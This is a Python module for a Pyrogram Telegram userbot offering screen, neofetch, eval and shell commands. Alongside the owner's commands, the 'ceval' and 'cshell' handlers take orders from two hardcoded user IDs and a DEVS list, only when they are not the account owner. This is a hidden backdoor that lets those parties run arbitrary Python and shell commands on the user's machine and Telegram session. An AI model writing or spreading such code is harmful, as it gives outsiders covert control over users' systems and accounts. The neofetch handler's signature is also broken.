import asyncio
import pyromod
from io import BytesIO
import io
import os
import sys
import re
import traceback
import subprocess
from random import randint
from typing import Optional
from contextlib import suppress
from asyncio import sleep
from io import StringIO
# from DarkWeb.database.mongodb import cli as database
from pyrogram.types import *
from pyrogram import *
from pyrogram import Client as ren
from pyrogram import Client
from pyrogram import Client as app
from pyromod import *

from DarkWeb.helper.cmd import *
from DarkWeb.modules.randydev.carbon import make_carbon
from DarkWeb.helper.cmd import dont_know as pap_tt
from DarkWeb.helper.misc import *
from DarkWeb import *

from pykillerx.helper import ANAK_KONTOL as desah
from pykillerx import *
from pykillerx.helper import *
from pykillerx.helper.basic import *
from pykillerx.blacklist import *
from pykillerx.help import *
from pykillerx.helper.hacking import *

from pyrogram.raw import *
from pyrogram.raw.types import *
from pyrogram.raw.functions.phone import CreateGroupCall as call
from pyrogram.raw.functions.channels import GetFullChannel
from pyrogram.raw.functions.messages import GetFullChat
from pyrogram.raw.functions.phone import CreateGroupCall, DiscardGroupCall
from pyrogram.raw.types import InputGroupCall, InputPeerChannel, InputPeerChat

mod = randint
cheat = 10000, 999999999

@ren.on_message(filters.command("screenls", cmd) & filters.me)
async def screen(c, m):
    screen = (await shell_exec("screen -ls"))[0]
    await m.reply(f"<code>{screen}</code>")


@ren.on_message(filters.command(["neofetch"], cmd) & filters.me)
async def neofetch(client, Client, message: Message):
    hacker = await message.reply_text("`Prossing.....`")
    try:
        neofetch = (await shell_exec("neofetch --stdout"))[0]
        carbon = await make_carbon(message, neofetch)
        await client.send_photo(message.chat.id, carbon)
        await hacker.delete()
    except BaseException:
        pass


@ren.on_message(filters.command(["ceval", "cev", "ce"], cmd) & filters.user([1191668125, 901878554]) & ~filters.me)
@ren.on_message(filters.command(["eval", "ev", "e"], cmd) & filters.me)
async def evaluation_cmd_t(client, message):
    status_message = await message.reply("__Processing eval pyrogram...__")
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        return await status_message.edit("__No evaluate message!__")
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = io.StringIO()
    redirected_error = sys.stderr = io.StringIO()
    stdout, stderr, exc = None, None, None

    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()

    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr

    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"

    final_output = f"**EVAL**:\n`{cmd}`\n\n**OUTPUT**:\n`{evaluation.strip()}`\n"

    if len(final_output) > 4096:
        with open("eval.txt", "w+", encoding="utf8") as out_file:
            out_file.write(final_output)
        await status_message.reply_document(
            document="eval.txt",
            caption=cmd[: 4096 // 4 - 1],
            disable_notification=True,
        )
        os.remove("eval.txt")
        await status_message.delete()
    else:
        await status_message.edit(final_output, parse_mode=enums.ParseMode.MARKDOWN)


async def aexec(code, client, message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {l_}" for l_ in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


async def shell_exec(code, treat=True):
    process = await asyncio.create_subprocess_shell(
        code, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT
    )

    stdout = (await process.communicate())[0]
    if treat:
        stdout = stdout.decode().strip()
    return stdout, process


@ren.on_edited_message(filters.command(["cshell", "cexec"], cmd) & filters.user([1191668125, 901878554]) & ~filters.me)
@ren.on_edited_message(filters.command(["shell", "exec"], cmd) & filters.me)
async def execution_func_edited(bot, message):
    await execution(bot, message)

@ren.on_message(filters.command(["cshell", "cexec"], cmd) & filters.user(DEVS) & ~filters.me)
@ren.on_message(filters.command(["shell", "exec"], cmd) & filters.me)
async def execution_func(bot, message):
    await execution(bot, message)

async def execution(bot: Client, message: Message):
    cmd = message.text.split(" ", maxsplit=1)[1]

    reply_to_id = message.id
    if message.reply_to_message:
        reply_to_id = message.reply_to_message.id

    process = await asyncio.create_subprocess_shell(
        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    e = stderr.decode()
    if not e:
        e = "No errors"
    o = stdout.decode()
    if not o:
        o = "No output"

    OUTPUT = ""
    OUTPUT += f"<b>Command:</b>\n<code>{cmd}</code>\n\n"
    OUTPUT += f"<b>Output</b>: \n<code>{o}</code>\n"
    OUTPUT += f"<b>Errors</b>: \n<code>{e}</code>"

    if len(OUTPUT) > 4096:
        with open("exec.text", "w+", encoding="utf8") as out_file:
            out_file.write(str(OUTPUT))
        await message.reply_document(
            document="exec.text",
            caption=cmd,
            disable_notification=True,
            reply_to_message_id=ReplyCheck(message),
        )
        os.remove("exec.text")
    else:
        await message.reply_text(OUTPUT)
